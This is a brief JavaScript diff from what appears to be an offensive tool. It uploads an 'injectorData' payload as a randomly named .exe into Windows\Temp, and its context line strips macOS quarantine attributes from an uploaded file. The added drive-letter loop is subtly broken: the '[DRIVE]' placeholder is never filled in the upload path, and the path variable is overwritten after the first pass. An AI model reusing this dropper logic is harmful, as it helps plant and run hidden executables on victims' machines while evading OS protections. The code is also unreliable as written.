@@ -250,8 +250,15 @@ if (fs.existsSync(args.config)) {
         await interact.execute('xattr', ['-r', '-d', 'com.apple.quarantine', upload.getPath()], true)   
         break
       case 'windows':
-        let uploadPath = session.getFilename().substring(0,2) + "\\Windows\\Temp"
-        upload = await interact.upload(`${uploadPath}\\${randomFileName()}.exe`, injectorData)
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        for (let index = 0; index < characters.length; ++index) {
+          let uploadPath = "[DRIVE]:\\Windows\\Temp"
+          userDataPath = userDataPath.replace('[DRIVE]', characters.charAt(index))
+          ls = await interact.ls(userDataPath)
+          if (ls.getExists()) {
+            upload = await interact.upload(`${uploadPath}\\${randomFileName()}.exe`, injectorData)
+          }
+        }
         break
     }
 
